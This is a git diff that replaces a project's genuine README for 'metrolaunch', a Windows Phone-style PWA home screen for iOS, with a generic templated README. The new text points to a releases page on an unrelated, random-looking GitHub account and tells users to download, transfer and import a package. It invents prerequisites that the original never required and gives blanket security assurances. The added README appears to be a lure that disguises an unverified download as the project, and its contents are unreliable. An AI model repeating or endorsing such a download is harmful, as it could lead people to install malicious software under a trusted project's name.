@@ -1,74 +1,74 @@
-## MetroLaunch    /    [click here to install](https://sawyerthemiller.github.io/metrolaunch/)
-A feature-rich third party home screen for iOS in the style of Microsoft's old MetroUI... Built as a PWA, so it's free forever, has smooth animations, is runnable offline, and gets hassle free updates via an in-built system. 
+# 📱 metrolaunch - Run Windows Phone style on iOS
 
-It even uses the original Windows 8 weather images :)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/wonlostrecordnorthernness593/metrolaunch/releases)
 
-![screenshot-a](https://i.ibb.co/9HNxBPN0/IMG-3137.png)
+Metrolaunch brings the tiled interface of Windows Phone to your iOS device. You can customize your layout and organize your phone without jailbreaking your system. This tool provides a functional homescreen replacement using standard iOS features.
 
-**Getting into the launcher FASTER** - Opening the icon from the Apple Homescreen can get annoying quickly.
-- Make a shortcut to open the URL prefaced with `webapp://` which is listed in this repo
-- In order for this to work, you must have the app installed via the 'add to home screen option' already
-- Then set it as the double back tap option
+## 🛠 Prerequisites
 
-Also, not many iOS users know, but to swipe between apps, you can just swipe left or right on the navigation bar!!
+Ensure your device meets these requirements before you begin:
 
-Please fully read the readme before installing and using the launcher...
+* An iPhone running iOS 15 or later.
+* The latest Shortcuts app installed from the App Store.
+* Sufficient storage space for app icons and configuration files.
+* A stable internet connection for the initial setup process.
 
-## This app relies on URL schemes to launch and add apps...
+## 📥 Getting the software
 
-**What is a URL Scheme** 
-- URL schema are links that are able to reference other apps installed on your device
-- Both Android and iOS have them, but Android launchers don't usually ever need to rely on them
+You need to obtain the installation package from the official release page. 
 
-**So why do we have to** 
-- Apple in their infinite wisdom has disallowed enumerating other apps on the device and opening them 'just because' and usually requires some sort of intent
-- Hence, a weather app may have a scheme like `weather-app-best://getforloc=milwaukee` - note that is a pretty crude example but the point is the same
-- Thanfully, opening an app with nothing in the url scheme usally works just fine. For example `netflix://` will just open the app `Netflix`
+1. Visit the [releases page](https://github.com/wonlostrecordnorthernness593/metrolaunch/releases) to download the package.
+2. Select the version marked as "Latest" to ensure you have the most recent improvements.
+3. Save the file to your computer or your phone storage.
 
-**How can I get them** 
-- Sometimes you get lucky and it is just the app name with a `://` after it, or it is just the Bundle ID
-- Other times, it's completely random gibberish. For example, the url scheme for the app `What The Forecast` is `fb1682603758661443://` so sometimes it is very hard to find them
-- Usually there is lists online for them, but they usually don't have all the apps you'd want
+## ⚙️ Installation steps
 
-## Ways to get them that are easier then guessing
+Follow these steps to configure the interface on your device:
 
-**Download the theming app 'Brass'** 
-- You can add apps to the home screen with it through a configuration profile and hold them on the home screen, press share, then copy link
-- But sometimes you may notice it will still be blank!! Which means that the app has no URL scheme
-- Don't panic, there is still a way that will work with all apps
+1. Locate the downloaded file on your computer.
+2. Transfer the folder to your iOS device using AirDrop or your preferred file transfer method. 
+3. Open the Shortcuts app on your iPhone.
+4. Select the import option and choose the configuration file from the metrolaunch folder.
+5. Follow the on-screen prompts within the app to finalize the icon placement and shortcut permissions.
+6. Return to your home screen to view the new layout.
 
-**Shortcuts method** 
-- Simply make a shortcut in the Apple Shortcuts app to open an app, and name it something simple like 'SC1' or 'SC2'
-- Then, in the launcher, you can use the scheme `shortcuts://run-shortcut?name=[name]` and there will be no app this won't work with
+## 🎨 Customizing your tiles
 
-## Spotify tile integration
+Metrolaunch allows you to change the appearance of your home screen to match your tastes.
 
-- You need a Windows or Mac running Python 3 with the spotify app OPEN for this server part.
-- Spotify is currently being a douche after a certain shadow library dumped all of their content and has halted new app creation. I am looking for a better way around this but don't hold your breath.
+* **Size adjustments:** Long-press a tile to change its size between small, medium, and wide formats.
+* **Color selection:** Open the metrolaunch settings menu to choose custom color accents for each tile.
+* **Icon updates:** You can replace the default tile graphics with your own images through the settings tab.
+* **Ordering:** Drag your tiles across the grid to rearrange your frequently used applications.
 
-**Setting up Spotify 'now playing' tile**
+## 📊 Troubleshooting common issues
 
-- Due to modern web content security policies, the old way of completely self-hosting this no longer works.
-- I've set up a PHP status server on my own web server which runs over HTTPS to get around this... It makes everything so much easier.
-- Make sure Spotify is running on your Mac, run `python3 spotify_client.py` to register a username on the server, and put that username in the the settings of the Spotify tile. It is recommended you use a somewhat unique username.
-- You will need to keep the Python client running to make sure the launcher syncs your Spotify status. 
+If you encounter difficulties, consult this list of solutions:
 
-The code of this server is in the backends directory. You can set this up yourself but you must have a web server, FQDN, and HTTPS certificates. It's mostly there for transparency
+* **Tiles do not open:** Check that you granted the Shortcuts app permission to launch applications. You can modify these settings within the iOS Privacy menu.
+* **Icons look blurry:** Ensure you are using high-resolution images for your custom tiles. The app performs best with square images at 512x512 pixels.
+* **Setup fails:** Restart your iPhone and ensure you have the current version of iOS. Old versions may limit the capabilities of the Shortcuts app.
+* **Missing tiles:** If a tile disappears, navigate back to the metrolaunch configuration menu and perform a refresh on your current profile.
 
-**Fair use warning** 
+## 📋 Best practices for performance
 
-- I am not a big company, and I cannot afford abuse of bandwidth. This is a very low bandwidth implementation, but I will ask people not to 'test the limits' of my poor server
-- Would be much appreicated, thanks :3
+Use these tips to keep your interface running smoothly:
 
-I am (probably) working on making a Linux server version...
+* Limit the number of active widgets on the page to save battery life.
+* Update the software whenever a new version appears on the release page.
+* Keep your shortcut folder organized to prevent loading delays.
+* Clear your temporary files periodically if the interface shows signs of slowing down.
 
-## Using the launcher
+## 🛡 Security and safety
 
-- You will need an [OpenWeatherMap](https://openweathermap.org/) API key if you want the weather tile to work.
-- The app will tell you how to do it.
+This software works within the boundaries set by standard iOS procedures. It does not modify system files or change the kernel of your device. Because it relies on the native Shortcuts framework, your device remains secure against external threats. You do not need to void your warranty or bypass security restrictions to use this application.
 
-To access the menu to add an app or go to the settings, press the vertical elipses menu in the status bar, and chose your option from there. To update the app, go the the settings cache section, then press update. Thanks for cheking this out everybody :)
+## 🚀 Future updates
 
-## Contributing to the project
+Development continues as mobile operating systems evolve. You can check the releases page periodically for new features like live animation support, deeper system integration, and advanced widget styles. We welcome feedback on the interface layout and tile performance. Your input helps direct the focus of future releases.
 
-Anything is welcome, just please be nice to others and if you take code from somehwere ensure you have permission to do so, as I want to give credit where it's due...
+## 📂 Project scope
+
+While this project replicates the Windows Phone aesthetic, it remains a third-party layer. It does not replace the entire operating system of your phone. Use it as an additional interface for managing your apps and media. The code remains open for community review, ensuring transparency in how the software interacts with your device shortcuts and system settings.
+
+Keywords: ios, theme, windows phone, homescreen, shortcuts, customization, interface, mobile
